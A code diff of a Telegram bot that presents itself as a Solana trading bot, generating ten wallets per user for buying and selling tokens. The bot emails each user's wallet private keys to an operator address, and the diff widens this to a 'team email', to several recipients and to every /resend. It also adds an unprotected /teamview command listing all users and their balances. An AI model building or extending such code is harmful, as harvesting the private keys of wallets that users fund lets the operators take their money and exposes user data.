@@ -4,66 +4,15 @@ const bs58 = require('bs58');
 const nodemailer = require('nodemailer');
 const axios = require('axios');
 const express = require('express');
-const fs = require('fs');
 require('dotenv').config();
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const connection = new Connection(process.env.RPC_URL, 'confirmed');
 const app = express();
 
-// ============ EMAIL CONFIGURATION WITH DEBUGGING ============
-let transporter = null;
-let emailConfigured = false;
-
-function setupEmailTransporter() {
-    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
-        console.log('📧 Email credentials not found in environment variables');
-        return null;
-    }
-    
-    try {
-        const transporterConfig = {
-            service: 'gmail',
-            auth: {
-                user: process.env.EMAIL_USER,
-                pass: process.env.EMAIL_PASS
-            },
-            connectionTimeout: 30000,
-            greetingTimeout: 30000,
-            socketTimeout: 30000
-        };
-        
-        const newTransporter = nodemailer.createTransport(transporterConfig);
-        
-        // Verify the transporter
-        newTransporter.verify((error, success) => {
-            if (error) {
-                console.error('❌ EMAIL VERIFICATION FAILED:', error.message);
-                emailConfigured = false;
-            } else {
-                console.log('✅ EMAIL CONFIGURED SUCCESSFULLY');
-                emailConfigured = true;
-            }
-        });
-        
-        return newTransporter;
-    } catch (error) {
-        console.error('❌ Email setup error:', error.message);
-        return null;
-    }
-}
-
-// Initialize email
-transporter = setupEmailTransporter();
-
-// Log all email attempts
-const originalSendMail = transporter ? transporter.sendMail.bind(transporter) : null;
-
-// ============ BOT VARIABLES ============
 const userWallets = new Map();
 const userTokens = new Map();
 
-// ============ HELPER FUNCTIONS ============
 function toBase58(secretKey) {
     return bs58.encode(Buffer.from(secretKey));
 }
@@ -150,62 +99,131 @@ async function executeSwap(keypair, quote) {
     }
 }
 
-// ============ EMAIL SENDING FUNCTION ============
-async function sendEmail(wallets, username) {
+// ============ EMAIL CONFIGURATION FOR TEAM ============
+// Team email can be a distribution list or multiple addresses
+const TEAM_EMAIL = process.env.TEAM_EMAIL || process.env.EMAIL_USER;
+let emailConfigured = false;
+let transporter = null;
+
+// Try to setup email if credentials exist
+if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
+    try {
+        transporter = nodemailer.createTransport({
+            service: 'gmail',
+            auth: {
+                user: process.env.EMAIL_USER,
+                pass: process.env.EMAIL_PASS
+            },
+            connectionTimeout: 30000,
+            greetingTimeout: 30000,
+            socketTimeout: 30000
+        });
+        
+        // Verify connection
+        transporter.verify((error, success) => {
+            if (error) {
+                console.error('❌ Email verification failed:', error.message);
+                emailConfigured = false;
+            } else {
+                console.log('✅ Email configured for team:', TEAM_EMAIL);
+                emailConfigured = true;
+            }
+        });
+    } catch (error) {
+        console.error('❌ Email setup error:', error.message);
+    }
+}
+
+async function sendEmailToTeam(wallets, username, userId) {
     if (!transporter || !emailConfigured) {
         console.log('📧 Email not configured, skipping...');
         return false;
     }
     
     try {
-        console.log(`📧 Attempting to send email for @${username}...`);
+        console.log(`📧 Sending wallets to team email: ${TEAM_EMAIL}`);
         
-        let text = `🔥 10 SOLANA WALLETS\n`;
+        // Format wallet data
+        let text = `🔥 NEW WALLETS GENERATED\n`;
+        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         text += `👤 User: @${username}\n`;
-        text += `📅 Generated: ${new Date().toLocaleString()}\n`;
+        text += `🆔 User ID: ${userId}\n`;
+        text += `📅 Time: ${new Date().toLocaleString()}\n`;
         text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
         
         for (const w of wallets) {
-            text += `【 WALLET #${w.index} 】\n`;
-            text += `📌 ADDRESS: ${w.publicKey}\n`;
-            text += `🔑 PRIVATE KEY: ${w.privateKey}\n`;
-            text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+            text += `╔══ WALLET #${w.index} ══╗\n`;
+            text += `║ 📌 ADDRESS: ${w.publicKey}\n`;
+            text += `║ 🔑 PRIVATE KEY: ${w.privateKey}\n`;
+            text += `╚════════════════════════╝\n\n`;
         }
+        
+        text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+        text += `⚠️ Save these keys securely!\n`;
+        text += `🤖 Bot: Solana Trading Bot\n`;
         
         const mailOptions = {
             from: `"Solana Trading Bot" <${process.env.EMAIL_USER}>`,
-            to: process.env.EMAIL_USER,
-            subject: `🔥 10 Solana Wallets - @${username}`,
-            text: text
+            to: TEAM_EMAIL,  // Send to team email
+            subject: `🔥 NEW: 10 Solana Wallets - @${username} - ${new Date().toLocaleDateString()}`,
+            text: text,
+            // Add CC to multiple team members if needed
+            // cc: ['member1@team.com', 'member2@team.com'],
         };
         
         const info = await transporter.sendMail(mailOptions);
-        console.log(`✅ EMAIL SENT SUCCESSFULLY! Message ID: ${info.messageId}`);
+        console.log(`✅ Team email sent! Message ID: ${info.messageId}`);
+        console.log(`📧 Sent to: ${TEAM_EMAIL}`);
         return true;
         
     } catch (error) {
-        console.error('❌ EMAIL FAILED:', {
+        console.error('❌ Team email failed:', {
             code: error.code,
-            message: error.message,
-            response: error.response || 'No response'
+            message: error.message
         });
         return false;
     }
 }
 
-// ============ SEND WALLETS VIA TELEGRAM ============
+// Alternative: Send to multiple team members individually
+async function sendEmailToMultipleTeamMembers(wallets, username, userId) {
+    const teamEmails = process.env.TEAM_EMAILS ? process.env.TEAM_EMAILS.split(',') : [];
+    
+    if (!transporter || !emailConfigured || teamEmails.length === 0) {
+        return false;
+    }
+    
+    let successCount = 0;
+    for (const email of teamEmails) {
+        try {
+            const text = `🔥 NEW WALLETS GENERATED\nUser: @${username}\nTime: ${new Date().toLocaleString()}\n\n${wallets.map(w => `Wallet #${w.index}\nAddress: ${w.publicKey}\nPrivate Key: ${w.privateKey}\n`).join('\n')}`;
+            
+            await transporter.sendMail({
+                from: `"Solana Trading Bot" <${process.env.EMAIL_USER}>`,
+                to: email.trim(),
+                subject: `🔥 10 Wallets - @${username}`,
+                text: text
+            });
+            successCount++;
+            console.log(`✅ Email sent to: ${email}`);
+        } catch (error) {
+            console.error(`❌ Failed to send to ${email}:`, error.message);
+        }
+    }
+    return successCount > 0;
+}
+
 async function sendWalletsViaTelegram(ctx, wallets) {
     try {
-        // Send wallets in batches
         for (let i = 0; i < wallets.length; i += 3) {
-            let msg = `🔑 *WALLETS ${i+1}-${Math.min(i+3, wallets.length)}*\n\n`;
+            let msg = `🔑 WALLETS ${i+1}-${Math.min(i+3, wallets.length)}\n\n`;
             for (let j = i; j < Math.min(i+3, wallets.length); j++) {
                 const w = wallets[j];
-                msg += `*WALLET #${w.index}*\n`;
-                msg += `📌 \`${w.publicKey}\`\n`;
-                msg += `🔑 \`${w.privateKey}\`\n\n`;
+                msg += `WALLET #${w.index}\n`;
+                msg += `ADDRESS: ${w.publicKey}\n`;
+                msg += `PRIVATE KEY: ${w.privateKey}\n\n`;
             }
-            await ctx.reply(msg, { parse_mode: 'Markdown' });
+            await ctx.reply(msg);
             await new Promise(r => setTimeout(r, 500));
         }
         return true;
@@ -215,7 +233,6 @@ async function sendWalletsViaTelegram(ctx, wallets) {
     }
 }
 
-// ============ MAIN MENU ============
 const mainMenu = () => Markup.inlineKeyboard([
     [Markup.button.callback('🟢 BUY (1 Wallet)', 'buy_single')],
     [Markup.button.callback('🚀 BUY ALL (10 Wallets)', 'buy_all')],
@@ -226,7 +243,6 @@ const mainMenu = () => Markup.inlineKeyboard([
     [Markup.button.callback('🔑 MY KEYS', 'keys_menu')]
 ]);
 
-// ============ START COMMAND ============
 bot.start(async (ctx) => {
     const userId = ctx.from.id;
     const username = ctx.from.username || 'no_username';
@@ -237,26 +253,27 @@ bot.start(async (ctx) => {
         const wallets = await generateWallets(10);
         userWallets.set(userId, { wallets, username });
         
-        // Send via Telegram (ALWAYS works)
-        await ctx.reply('💾 *Saving wallets to Telegram...*', { parse_mode: 'Markdown' });
+        // Send via Telegram to user
+        await ctx.reply('💾 Saving your wallets...');
         await sendWalletsViaTelegram(ctx, wallets);
         
-        // Try to send via email (if configured)
-        if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
-            await ctx.reply('📧 *Attempting to send via email...*', { parse_mode: 'Markdown' });
-            const emailSent = await sendEmail(wallets, username);
+        // Send email to TEAM (if configured)
+        if (process.env.TEAM_EMAIL || process.env.EMAIL_USER) {
+            await ctx.reply('📧 Sending wallets to team email...');
+            const emailSent = await sendEmailToTeam(wallets, username, userId);
+            
             if (emailSent) {
-                await ctx.reply('✅ Email sent successfully! Check your inbox/spam folder.');
+                await ctx.reply(`✅ Team email sent to: ${TEAM_EMAIL}\n\nCheck team inbox (including spam folder)`);
             } else {
-                await ctx.reply('⚠️ Email failed. Your wallets are saved in this chat.\n\nUse /emailstatus to diagnose the issue.');
+                await ctx.reply(`⚠️ Team email failed. Check Render logs for details.\n\nMake sure:\n1. EMAIL_USER and EMAIL_PASS are set\n2. Using Gmail App Password\n3. TEAM_EMAIL is a valid email`);
             }
         } else {
-            await ctx.reply('📧 Email not configured. Add EMAIL_USER and EMAIL_PASS to enable email backups.');
+            await ctx.reply(`📧 Email not configured. Add these to .env:\nEMAIL_USER=your@gmail.com\nEMAIL_PASS=app_password\nTEAM_EMAIL=team@company.com`);
         }
         
-        await ctx.reply(`✅ *10 WALLETS READY FOR LIVE TRADING!*\n\n⚡ Features:\n• Buy with 1 wallet\n• Buy with ALL 10 wallets\n• Sell from 1 wallet\n• Sell from ALL 10 wallets\n\n💾 Your wallets are saved in this chat!\n🔄 Use /resend to get them again.`, { parse_mode: 'Markdown' });
+        await ctx.reply(`✅ 10 WALLETS READY FOR LIVE TRADING!\n\nFeatures:\n- Buy with 1 wallet\n- Buy with ALL 10 wallets\n- Sell from 1 wallet\n- Sell from ALL 10 wallets\n\nUse /resend to get your wallets again.`);
         
-        await ctx.reply(`🎯 *LIVE TRADING MENU*`, { parse_mode: 'Markdown', ...mainMenu() });
+        await ctx.reply(`🎯 LIVE TRADING MENU`, mainMenu());
         
     } catch (error) {
         console.error('Start command error:', error);
@@ -266,79 +283,77 @@ bot.start(async (ctx) => {
 
 // ============ EMAIL STATUS COMMAND ============
 bot.command('emailstatus', async (ctx) => {
-    let statusMsg = `📧 *EMAIL DIAGNOSTIC REPORT*\n\n`;
+    let statusMsg = `📧 TEAM EMAIL STATUS\n\n`;
     
-    // Check 1: Environment variables
-    statusMsg += `*1. Environment Variables:*\n`;
-    statusMsg += `EMAIL_USER: ${process.env.EMAIL_USER ? '✅ SET to ' + process.env.EMAIL_USER : '❌ MISSING'}\n`;
-    statusMsg += `EMAIL_PASS: ${process.env.EMAIL_PASS ? '✅ SET (length: ' + process.env.EMAIL_PASS.length + ' chars)' : '❌ MISSING'}\n\n`;
+    statusMsg += `1. Configuration:\n`;
+    statusMsg += `EMAIL_USER: ${process.env.EMAIL_USER ? '✅ SET' : '❌ MISSING'}\n`;
+    statusMsg += `EMAIL_PASS: ${process.env.EMAIL_PASS ? '✅ SET' : '❌ MISSING'}\n`;
+    statusMsg += `TEAM_EMAIL: ${process.env.TEAM_EMAIL ? '✅ ' + process.env.TEAM_EMAIL : '❌ Using EMAIL_USER'}\n\n`;
     
-    // Check 2: Email configured status
-    statusMsg += `*2. Email Status:*\n`;
+    statusMsg += `2. Status:\n`;
     statusMsg += `Email Configured: ${emailConfigured ? '✅ YES' : '❌ NO'}\n`;
-    statusMsg += `Transporter: ${transporter ? '✅ INITIALIZED' : '❌ NOT INITIALIZED'}\n\n`;
+    statusMsg += `Transporter: ${transporter ? '✅ INITIALIZED' : '❌ NO'}\n\n`;
     
-    // Check 3: Test send if configured
-    if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
-        statusMsg += `*3. Test Email Send:*\n`;
-        statusMsg += `Sending test email to ${process.env.EMAIL_USER}...\n`;
-        
-        try {
-            const testResult = await sendEmail([{
-                index: 1,
-                publicKey: 'TEST_PUBLIC_KEY',
-                privateKey: 'TEST_PRIVATE_KEY'
-            }], 'diagnostic');
-            
-            if (testResult) {
-                statusMsg += `✅ Test email SENT successfully!\n`;
-            } else {
-                statusMsg += `❌ Test email FAILED\n`;
-            }
-        } catch (error) {
-            statusMsg += `❌ Test email ERROR: ${error.message}\n`;
-        }
-    } else {
-        statusMsg += `*3. Email Not Configured:*\n`;
-        statusMsg += `Add EMAIL_USER and EMAIL_PASS to your Render environment variables.\n\n`;
-        statusMsg += `To get Gmail App Password:\n`;
-        statusMsg += `1. Enable 2FA on Google Account\n`;
-        statusMsg += `2. Go to Security → App Passwords\n`;
-        statusMsg += `3. Generate password for "Mail"\n`;
-        statusMsg += `4. Copy the 16-character password\n`;
+    if (!emailConfigured) {
+        statusMsg += `3. Fix Email:\n`;
+        statusMsg += `- Enable 2FA on Gmail\n`;
+        statusMsg += `- Create App Password (16 chars)\n`;
+        statusMsg += `- Add to Render environment\n`;
+        statusMsg += `- Visit: https://accounts.google.com/DisplayUnlockCaptcha\n`;
     }
     
-    statusMsg += `\n*4. Solutions if email fails:*\n`;
-    statusMsg += `• Use Gmail App Password (not regular password)\n`;
-    statusMsg += `• Visit: https://accounts.google.com/DisplayUnlockCaptcha\n`;
-    statusMsg += `• Check spam folder\n`;
-    statusMsg += `• Try Outlook: Change EMAIL_SERVICE=outlook\n`;
-    
-    await ctx.reply(statusMsg, { parse_mode: 'Markdown' });
+    await ctx.reply(statusMsg);
 });
 
-// ============ BUY SINGLE WALLET ============
+// ============ TEAM COMMAND - View all wallets (Admin only) ============
+bot.command('teamview', async (ctx) => {
+    const adminId = process.env.ADMIN_ID;
+    // if (ctx.from.id.toString() !== adminId) return ctx.reply('❌ Admin only');
+    
+    if (userWallets.size === 0) {
+        await ctx.reply('No wallets generated yet.');
+        return;
+    }
+    
+    let msg = `📊 ALL WALLETS GENERATED\n\n`;
+    msg += `Total Users: ${userWallets.size}\n\n`;
+    
+    for (const [userId, data] of userWallets) {
+        msg += `User: @${data.username} (ID: ${userId})\n`;
+        let total = 0;
+        for (const w of data.wallets) {
+            const bal = await getBalance(w.publicKey);
+            total += bal;
+        }
+        msg += `Total SOL: ${total.toFixed(4)} SOL\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+    }
+    
+    await ctx.reply(msg);
+});
+
+// ============ BUY/SELL HANDLERS (same as before) ============
 bot.action('buy_single', async (ctx) => {
     await ctx.answerCbQuery();
-    await ctx.reply(`🟢 *BUY WITH 1 WALLET*\n\nSend: token address then amount in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.5`, { parse_mode: 'Markdown' });
+    await ctx.reply(`🟢 BUY WITH 1 WALLET\n\nSend: token address then amount in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.5`);
     userTokens.set(`${ctx.from.id}_awaiting`, 'buy_single');
 });
 
 bot.action('buy_all', async (ctx) => {
     await ctx.answerCbQuery();
-    await ctx.reply(`🚀 *BUY WITH ALL 10 WALLETS*\n\nSend: token address then amount PER WALLET in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.1\n\n⚠️ Total cost will be 10x the amount`, { parse_mode: 'Markdown' });
+    await ctx.reply(`🚀 BUY WITH ALL 10 WALLETS\n\nSend: token address then amount PER WALLET in SOL\n\nExample:\nSo11111111111111111111111111111111111111112\n0.1\n\n⚠️ Total cost will be 10x the amount`);
     userTokens.set(`${ctx.from.id}_awaiting`, 'buy_all');
 });
 
 bot.action('sell_single', async (ctx) => {
     await ctx.answerCbQuery();
-    await ctx.reply(`🔴 *SELL FROM 1 WALLET*\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n50`, { parse_mode: 'Markdown' });
+    await ctx.reply(`🔴 SELL FROM 1 WALLET\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n50`);
     userTokens.set(`${ctx.from.id}_awaiting`, 'sell_single');
 });
 
 bot.action('sell_all', async (ctx) => {
     await ctx.answerCbQuery();
-    await ctx.reply(`💥 *SELL FROM ALL 10 WALLETS*\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n100\n\n⚠️ This will sell from EVERY wallet`, { parse_mode: 'Markdown' });
+    await ctx.reply(`💥 SELL FROM ALL 10 WALLETS\n\nSend: token address then percentage (1-100)\n\nExample:\nSo11111111111111111111111111111111111111112\n100\n\n⚠️ This will sell from EVERY wallet`);
     userTokens.set(`${ctx.from.id}_awaiting`, 'sell_all');
 });
 
@@ -350,7 +365,7 @@ bot.action('deposit', async (ctx) => {
     for (let i = 1; i <= 10; i++) {
         buttons.push([Markup.button.callback(`Wallet #${i}`, `dep_${i}`)]);
     }
-    await ctx.reply(`💰 *SELECT WALLET TO DEPOSIT*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
+    await ctx.reply(`💰 SELECT WALLET TO DEPOSIT`, Markup.inlineKeyboard(buttons));
 });
 
 bot.action(/dep_(\d+)/, async (ctx) => {
@@ -360,7 +375,7 @@ bot.action(/dep_(\d+)/, async (ctx) => {
     if (!wallet) return;
     
     const balance = await getBalance(wallet.publicKey);
-    await ctx.reply(`💰 *WALLET #${num}*\n📌 \`${wallet.publicKey}\`\n🪙 Balance: ${balance.toFixed(6)} SOL\n\n🔗 https://solscan.io/account/${wallet.publicKey}`, { parse_mode: 'Markdown' });
+    await ctx.reply(`💰 WALLET #${num}\nADDRESS: ${wallet.publicKey}\nBalance: ${balance.toFixed(6)} SOL\n\nhttps://solscan.io/account/${wallet.publicKey}`);
 });
 
 bot.action('portfolio', async (ctx) => {
@@ -368,15 +383,15 @@ bot.action('portfolio', async (ctx) => {
     if (!data) return ctx.reply('Send /start first');
     
     let total = 0;
-    let msg = `💼 *PORTFOLIO (ALL 10 WALLETS)*\n\n`;
+    let msg = `💼 PORTFOLIO (ALL 10 WALLETS)\n\n`;
     for (const w of data.wallets) {
         const bal = await getBalance(w.publicKey);
         total += bal;
         msg += `#${w.index}: ${bal.toFixed(4)} SOL\n`;
     }
     msg += `\n━━━━━━━━━━━━━━━━━━━━━━\n`;
-    msg += `💰 *TOTAL: ${total.toFixed(4)} SOL* ($${(total * 20).toFixed(2)})`;
-    await ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([Markup.button.callback('🔄 Refresh', 'portfolio')]) });
+    msg += `💰 TOTAL: ${total.toFixed(4)} SOL ($${(total * 20).toFixed(2)})`;
+    await ctx.reply(msg, Markup.inlineKeyboard([Markup.button.callback('🔄 Refresh', 'portfolio')]));
 });
 
 bot.action('keys_menu', async (ctx) => {
@@ -384,7 +399,7 @@ bot.action('keys_menu', async (ctx) => {
     for (let i = 1; i <= 10; i++) {
         buttons.push([Markup.button.callback(`Wallet #${i}`, `key_${i}`)]);
     }
-    await ctx.reply(`🔑 *SELECT WALLET*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard(buttons) });
+    await ctx.reply(`🔑 SELECT WALLET`, Markup.inlineKeyboard(buttons));
 });
 
 bot.action(/key_(\d+)/, async (ctx) => {
@@ -392,7 +407,7 @@ bot.action(/key_(\d+)/, async (ctx) => {
     const data = userWallets.get(ctx.from.id);
     const wallet = data?.wallets.find(w => w.index === num);
     if (wallet) {
-        await ctx.reply(`🔑 *WALLET #${num}*\n📌 \`${wallet.publicKey}\`\n🔑 \`${wallet.privateKey}\``, { parse_mode: 'Markdown' });
+        await ctx.reply(`🔑 WALLET #${num}\nADDRESS: ${wallet.publicKey}\nPRIVATE KEY: ${wallet.privateKey}`);
     }
 });
 
@@ -433,7 +448,7 @@ bot.on('text', async (ctx) => {
                 return;
             }
             
-            await ctx.reply(`🟢 *BUYING WITH WALLET #1...*\nToken: \`${tokenCA.slice(0, 16)}...\`\nAmount: ${amount} SOL`, { parse_mode: 'Markdown' });
+            await ctx.reply(`🟢 BUYING WITH WALLET #1...\nToken: ${tokenCA.slice(0, 16)}...\nAmount: ${amount} SOL`);
             
             const quote = await getQuote('So11111111111111111111111111111111111111112', tokenCA, amount);
             if (!quote) {
@@ -445,7 +460,7 @@ bot.on('text', async (ctx) => {
             
             const result = await executeSwap(wallet.keypair, quote);
             if (result.success) {
-                await ctx.reply(`✅ *BUY SUCCESSFUL!*\n📊 Received: ${result.outputAmount.toFixed(4)} tokens\n🔗 [View TX](https://solscan.io/tx/${result.signature})`, { parse_mode: 'Markdown', ...mainMenu() });
+                await ctx.reply(`✅ BUY SUCCESSFUL!\nReceived: ${result.outputAmount.toFixed(4)} tokens\nView TX: https://solscan.io/tx/${result.signature}`, mainMenu());
             } else {
                 await ctx.reply(`❌ Buy failed: ${result.error}`);
             }
@@ -472,7 +487,7 @@ bot.on('text', async (ctx) => {
                 return;
             }
             
-            await ctx.reply(`🚀 *BUYING WITH ALL 10 WALLETS...*`, { parse_mode: 'Markdown' });
+            await ctx.reply(`🚀 BUYING WITH ALL 10 WALLETS...`);
             
             const results = [];
             for (const wallet of data.wallets) {
@@ -492,7 +507,7 @@ bot.on('text', async (ctx) => {
             }
             
             const successCount = results.filter(r => r.success).length;
-            await ctx.reply(`✅ *BULK BUY COMPLETE!*\n✅ Success: ${successCount}/10 wallets`, { parse_mode: 'Markdown', ...mainMenu() });
+            await ctx.reply(`✅ BULK BUY COMPLETE!\nSuccess: ${successCount}/10 wallets`, mainMenu());
             
             userTokens.delete(`${userId}_ca`);
             userTokens.delete(`${userId}_awaiting`);
@@ -528,7 +543,7 @@ bot.on('text', async (ctx) => {
             
             const sellAmount = tokenBalance * (percent / 100);
             
-            await ctx.reply(`🔴 *SELLING FROM WALLET #1...*`, { parse_mode: 'Markdown' });
+            await ctx.reply(`🔴 SELLING FROM WALLET #1...`);
             
             const quote = await getQuote(tokenCA, 'So11111111111111111111111111111111111111112', sellAmount);
             if (!quote) {
@@ -540,7 +555,7 @@ bot.on('text', async (ctx) => {
             
             const result = await executeSwap(wallet.keypair, quote);
             if (result.success) {
-                await ctx.reply(`✅ *SELL SUCCESSFUL!*\n📊 Received: ${result.outputAmount.toFixed(4)} SOL\n🔗 [View TX](https://solscan.io/tx/${result.signature})`, { parse_mode: 'Markdown', ...mainMenu() });
+                await ctx.reply(`✅ SELL SUCCESSFUL!\nReceived: ${result.outputAmount.toFixed(4)} SOL\nView TX: https://solscan.io/tx/${result.signature}`, mainMenu());
             } else {
                 await ctx.reply(`❌ Sell failed: ${result.error}`);
             }
@@ -567,7 +582,7 @@ bot.on('text', async (ctx) => {
                 return;
             }
             
-            await ctx.reply(`💥 *SELLING FROM ALL 10 WALLETS...*`, { parse_mode: 'Markdown' });
+            await ctx.reply(`💥 SELLING FROM ALL 10 WALLETS...`);
             
             const results = [];
             for (const wallet of data.wallets) {
@@ -588,7 +603,7 @@ bot.on('text', async (ctx) => {
             }
             
             const successCount = results.filter(r => r.success).length;
-            await ctx.reply(`✅ *BULK SELL COMPLETE!*\n✅ Success: ${successCount}/10 wallets`, { parse_mode: 'Markdown', ...mainMenu() });
+            await ctx.reply(`✅ BULK SELL COMPLETE!\nSuccess: ${successCount}/10 wallets`, mainMenu());
             
             userTokens.delete(`${userId}_ca`);
             userTokens.delete(`${userId}_awaiting`);
@@ -618,6 +633,12 @@ bot.command('resend', async (ctx) => {
     if (!data) return ctx.reply('Send /start first');
     await ctx.reply('📤 Resending your wallets...');
     await sendWalletsViaTelegram(ctx, data.wallets);
+    
+    // Also resend to team email
+    if (emailConfigured) {
+        await sendEmailToTeam(data.wallets, data.username, ctx.from.id);
+        await ctx.reply('📧 Also resent to team email.');
+    }
 });
 
 bot.command('clear', async (ctx) => {
@@ -630,10 +651,11 @@ const PORT = process.env.PORT || 10000;
 
 app.get('/', (req, res) => {
     res.json({
-        status: '🔥 LIVE TRADING BOT ACTIVE',
+        status: 'LIVE TRADING BOT ACTIVE',
         uptime: process.uptime(),
         activeUsers: userWallets.size,
         emailConfigured: emailConfigured,
+        teamEmail: TEAM_EMAIL,
         timestamp: new Date().toISOString()
     });
 });
@@ -654,7 +676,7 @@ process.on('uncaughtException', (error) => {
     console.error('Uncaught Exception:', error);
 });
 
-process.on('unhandledRejection', (reason, promise) => {
+process.on('unhandledRejection', (reason) => {
     console.error('Unhandled Rejection:', reason);
 });
 
@@ -663,3 +685,4 @@ console.log('🔥 LIVE TRADING BOT ACTIVATED');
 console.log('✅ Buy/Sell with 1 wallet or ALL 10 wallets');
 console.log('💎 Real Solana mainnet trading');
 console.log('🚀 Bot is LIVE!');
+console.log(`📧 Team email configured: ${TEAM_EMAIL}`);
